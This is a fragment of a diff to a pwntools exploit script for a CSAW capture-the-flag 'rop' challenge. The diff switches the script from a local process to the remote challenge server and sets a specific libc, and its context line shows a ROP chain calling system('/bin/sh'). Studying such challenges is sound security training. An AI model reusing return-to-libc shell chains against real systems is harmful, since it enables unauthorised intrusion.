@@ -60,9 +60,9 @@ rop = base + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) + p64(ret) + p64(l
 from pwn import *
 from Crypto.Util.number import *
 
-#p = remote('pwn.chal.csaw.io', 5016)
-p = process("rop")
-libc = ELF("libc.so.6")
+p = remote('pwn.chal.csaw.io', 5016)
+#p = process("rop")
+libc = ELF("libc-2.27.so")
 
 elf = ELF("rop")
 rop = ROP(elf)
